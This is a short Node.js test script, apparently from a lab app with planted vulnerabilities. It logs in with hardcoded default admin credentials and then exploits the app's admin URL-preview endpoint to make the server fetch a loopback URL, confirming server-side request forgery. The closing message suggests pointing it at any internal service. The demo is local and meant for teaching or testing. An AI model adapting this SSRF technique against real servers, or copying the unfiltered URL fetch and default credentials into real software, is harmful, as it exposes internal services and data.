// ============================================================================
//  LOCAL, APP-ONLY test case: SSRF via the admin URL-preview feature of THIS
//  app. Hard-wired to http://127.0.0.1:3000. Demonstrates the planted
//  [VULN: SSRF — Task 3] in src/app/api/admin/url-preview/route.ts by asking
//  the server to fetch a LOOPBACK URL it should never reach on the client's
//  behalf.
//
//  Usage:  node tests/ssrf-demo.mjs
// ============================================================================
const BASE = "http://127.0.0.1:3000";

// 1) Log in as the (default) admin to obtain a session cookie.
const loginRes = await fetch(`${BASE}/api/login`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email: "admin@campus.local", password: "admin123" }),
});
const cookies = loginRes.headers.getSetCookie?.() ?? [];
const sid = cookies.map((c) => c.split(";")[0]).join("; ");
if (!sid) {
  console.error("Could not obtain admin session (is the DB seeded / server up?).");
  process.exit(1);
}
console.log("Logged in as admin; session cookie acquired.");

// 2) Ask the server to fetch an internal/loopback URL. A safe implementation
//    would refuse 127.0.0.1 / localhost / link-local / private ranges.
const internalTarget = "http://127.0.0.1:3000/login";
console.log("\nAsking the SERVER to fetch:", internalTarget);

const res = await fetch(`${BASE}/api/admin/url-preview`, {
  method: "POST",
  headers: { "Content-Type": "application/json", Cookie: sid },
  body: JSON.stringify({ url: internalTarget }),
});
const data = await res.json();

console.log("HTTP status of preview call:", res.status);
console.log("Server fetched status:", data.status, data.statusText);
console.log("Returned body snippet (first 200 chars):");
console.log("  " + String(data.bodySnippet ?? data.error ?? "").slice(0, 200).replace(/\n/g, " "));

if (data.ok) {
  console.log(
    "\n[SSRF CONFIRMED] The server followed a loopback URL and returned its body — " +
      "no host/scheme/IP restrictions are applied. Point this at any internal service to read it."
  );
}
